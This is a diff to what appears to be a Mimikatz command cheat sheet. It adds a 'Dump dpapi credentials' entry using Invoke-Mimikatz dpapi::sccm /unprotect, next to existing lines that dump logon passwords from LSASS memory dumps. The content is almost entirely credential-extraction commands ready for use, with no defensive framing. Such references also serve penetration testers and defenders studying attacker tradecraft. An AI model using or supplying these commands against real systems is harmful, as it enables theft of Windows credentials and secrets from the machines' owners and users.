@@ -43,6 +43,11 @@ mimi> sekurlsa::minidump <file>.dmp
 mimi> sekurlsa::logonPasswords full
 ```
 
+### Dump dpapi credentials
+```
+Invoke-Mimikatz -Command '"dpapi::sccm /unprotect /masterkey:key"'
+```
+
 ### Write output of command to file
 ```
 mimi> log <file>.txt
